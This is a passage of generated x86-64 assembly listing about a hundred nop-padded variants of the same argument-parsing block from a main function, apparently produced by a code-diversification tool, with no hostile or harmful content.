	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 26
.Lmain_win5_var26:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 27
.Lmain_win5_var27:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 28
.Lmain_win5_var28:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 29
.Lmain_win5_var29:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 30
.Lmain_win5_var30:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 31
.Lmain_win5_var31:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 32
.Lmain_win5_var32:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 33
.Lmain_win5_var33:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 34
.Lmain_win5_var34:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 35
.Lmain_win5_var35:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 36
.Lmain_win5_var36:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 37
.Lmain_win5_var37:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 38
.Lmain_win5_var38:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 39
.Lmain_win5_var39:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 40
.Lmain_win5_var40:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 41
.Lmain_win5_var41:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 42
.Lmain_win5_var42:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	nop
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 43
.Lmain_win5_var43:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 44
.Lmain_win5_var44:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 45
.Lmain_win5_var45:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 46
.Lmain_win5_var46:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 47
.Lmain_win5_var47:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 48
.Lmain_win5_var48:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 49
.Lmain_win5_var49:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 50
.Lmain_win5_var50:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 51
.Lmain_win5_var51:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 52
.Lmain_win5_var52:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 53
.Lmain_win5_var53:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 54
.Lmain_win5_var54:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 55
.Lmain_win5_var55:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 56
.Lmain_win5_var56:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 57
.Lmain_win5_var57:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 58
.Lmain_win5_var58:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 59
.Lmain_win5_var59:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 60
.Lmain_win5_var60:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 61
.Lmain_win5_var61:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 62
.Lmain_win5_var62:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 63
.Lmain_win5_var63:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 64
.Lmain_win5_var64:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 65
.Lmain_win5_var65:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 66
.Lmain_win5_var66:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 67
.Lmain_win5_var67:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 68
.Lmain_win5_var68:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 69
.Lmain_win5_var69:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 70
.Lmain_win5_var70:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 71
.Lmain_win5_var71:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 72
.Lmain_win5_var72:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 73
.Lmain_win5_var73:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 74
.Lmain_win5_var74:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 75
.Lmain_win5_var75:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	nop
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 76
.Lmain_win5_var76:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 77
.Lmain_win5_var77:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 78
.Lmain_win5_var78:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 79
.Lmain_win5_var79:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 80
.Lmain_win5_var80:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 81
.Lmain_win5_var81:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 82
.Lmain_win5_var82:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 83
.Lmain_win5_var83:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 84
.Lmain_win5_var84:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 85
.Lmain_win5_var85:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 86
.Lmain_win5_var86:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 87
.Lmain_win5_var87:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 88
.Lmain_win5_var88:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 89
.Lmain_win5_var89:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 90
.Lmain_win5_var90:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 91
.Lmain_win5_var91:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 92
.Lmain_win5_var92:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 93
.Lmain_win5_var93:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 94
.Lmain_win5_var94:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 95
.Lmain_win5_var95:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 96
.Lmain_win5_var96:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 97
.Lmain_win5_var97:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 98
.Lmain_win5_var98:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 99
.Lmain_win5_var99:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 100
.Lmain_win5_var100:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 101
.Lmain_win5_var101:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 102
.Lmain_win5_var102:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 103
.Lmain_win5_var103:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	nop
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 104
.Lmain_win5_var104:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 105
.Lmain_win5_var105:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 106
.Lmain_win5_var106:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 107
.Lmain_win5_var107:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 108
.Lmain_win5_var108:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 109
.Lmain_win5_var109:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 110
.Lmain_win5_var110:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 111
.Lmain_win5_var111:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 112
.Lmain_win5_var112:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 113
.Lmain_win5_var113:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	nop
	jmp	.Lmain_win5_continue
## Variant 114
.Lmain_win5_var114:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 115
.Lmain_win5_var115:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 116
.Lmain_win5_var116:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 117
.Lmain_win5_var117:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 118
.Lmain_win5_var118:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
